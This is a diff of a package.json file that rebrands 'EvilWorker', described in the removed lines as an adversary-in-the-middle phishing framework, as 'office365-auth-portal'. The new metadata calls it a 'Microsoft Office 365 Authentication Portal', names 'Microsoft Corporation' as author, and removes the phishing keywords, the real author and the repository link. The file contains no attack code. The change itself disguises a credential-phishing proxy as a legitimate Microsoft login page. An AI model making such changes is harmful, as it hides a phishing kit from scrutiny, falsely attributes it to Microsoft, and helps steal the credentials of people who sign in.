@@ -1,25 +1,16 @@
 {
-  "name": "evilworker-proxy",
+  "name": "office365-auth-portal",
   "version": "1.0.0",
-  "description": "EvilWorker - AiTM attack framework using service workers",
-  "main": "proxy_server.js",
+  "description": "Microsoft Office 365 Authentication Portal",
+  "main": "proxy_server_improved.js",
   "scripts": {
-    "start": "node proxy_server.js",
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "start": "node proxy_server_improved.js",
+    "dev": "node proxy_server_improved.js"
   },
+  "keywords": ["office365", "authentication", "microsoft", "auth", "portal"],
+  "author": "Microsoft Corporation",
+  "license": "MIT",
   "engines": {
-    "node": ">=22.15.0"
-  },
-  "keywords": [
-    "aitm",
-    "phishing",
-    "service-worker",
-    "proxy"
-  ],
-  "author": "Antoine Hazebrouck",
-  "license": "BSD-2-Clause",
-  "repository": {
-    "type": "git",
-    "url": "https://github.com/Ahaz1701/EvilWorker.git"
+    "node": ">=18.0.0"
   }
 }
